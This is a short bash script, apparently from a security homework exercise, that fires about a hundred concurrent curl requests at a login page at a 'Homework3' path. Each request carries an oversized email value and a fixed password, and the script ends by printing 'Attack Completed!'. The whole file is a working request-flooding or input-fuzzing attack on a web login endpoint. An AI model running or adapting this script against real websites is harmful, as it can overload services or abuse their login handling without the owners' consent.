#!/bin/bash

task(){
   curl -s "http://www.wsb.com/Homework3/final/index.php?email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!&password=test" >/dev/null
}

N=4

(
for i in {0..100}; do 
   ((i=i%N)); ((i++==0)) && wait
   task "$i" & 
done
)

echo "Attack Completed!"